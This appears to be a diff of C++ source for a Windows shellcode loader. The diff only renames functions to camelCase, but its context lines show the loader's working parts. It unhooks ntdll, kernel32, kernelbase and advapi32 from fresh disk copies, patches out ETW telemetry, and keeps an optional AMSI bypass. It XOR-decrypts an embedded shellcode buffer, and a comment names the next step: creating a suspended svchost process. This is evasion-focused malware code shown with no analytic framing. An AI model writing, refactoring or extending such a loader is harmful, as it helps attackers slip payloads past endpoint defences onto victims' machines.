@@ -33,7 +33,7 @@ const SIZE_T g_xor_key_len = sizeof(g_xor_key);
 
 // Utilities
 
-static bool read_whole_file(const wchar_t* path, std::vector<BYTE>& out)
+static bool readWholeFile(const wchar_t* path, std::vector<BYTE>& out)
 {
     HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -53,7 +53,7 @@ static bool read_whole_file(const wchar_t* path, std::vector<BYTE>& out)
 
 // 1. DLL UNHOOKING
 
-static void unhook_module(const wchar_t* moduleName)
+static void unhookModule(const wchar_t* moduleName)
 {
     HMODULE loaded = GetModuleHandleW(moduleName);
     if (!loaded)
@@ -66,7 +66,7 @@ static void unhook_module(const wchar_t* moduleName)
     _snwprintf_s(path, MAX_PATH, _TRUNCATE, L"%s\\%s", sysdir, moduleName);
 
     std::vector<BYTE> fresh;
-    if (!read_whole_file(path, fresh) || fresh.size() < sizeof(IMAGE_DOS_HEADER))
+    if (!readWholeFile(path, fresh) || fresh.size() < sizeof(IMAGE_DOS_HEADER))
         return;
 
     PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)fresh.data();
@@ -97,7 +97,7 @@ static void unhook_module(const wchar_t* moduleName)
 
 // 2. TELEMETRY BYPASSES
 
-static void bypass_etw()
+static void bypassEtw()
 {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return;
@@ -112,7 +112,7 @@ static void bypass_etw()
 }
 
 // Enable by uncommenting the call in main()
-static void bypass_amsi()
+static void bypassAmsi()
 {
     HMODULE amsi = LoadLibraryA("amsi.dll");
     if (!amsi) return;
@@ -131,7 +131,7 @@ static void bypass_amsi()
 
 // 3. XOR DECRYPTION (chunked)
 
-static void xor_decrypt_chunked(unsigned char* buf, SIZE_T len,
+static void xorDecryptChunked(unsigned char* buf, SIZE_T len,
                                 const unsigned char* key, SIZE_T keyLen)
 {
     for (SIZE_T off = 0; off < len; off += CHUNK_SIZE) {
@@ -149,17 +149,17 @@ static void xor_decrypt_chunked(unsigned char* buf, SIZE_T len,
 int main()
 {
     // --- 1. Unhooking ---
-    unhook_module(L"ntdll.dll");
-    unhook_module(L"kernel32.dll");
-    unhook_module(L"kernelbase.dll");
-    unhook_module(L"advapi32.dll");
+    unhookModule(L"ntdll.dll");
+    unhookModule(L"kernel32.dll");
+    unhookModule(L"kernelbase.dll");
+    unhookModule(L"advapi32.dll");
 
     // --- 2. Telemetry ---
-    bypass_etw();
-    // bypass_amsi();
+    bypassEtw();
+    // bypassAmsi();
 
     // --- 3. Decryption ---
-    xor_decrypt_chunked(g_shellcode, g_shellcode_len, g_xor_key, g_xor_key_len);
+    xorDecryptChunked(g_shellcode, g_shellcode_len, g_xor_key, g_xor_key_len);
 
     // --- 4. Process creation (suspended svchost) ---
     wchar_t sysdir[MAX_PATH] = {};
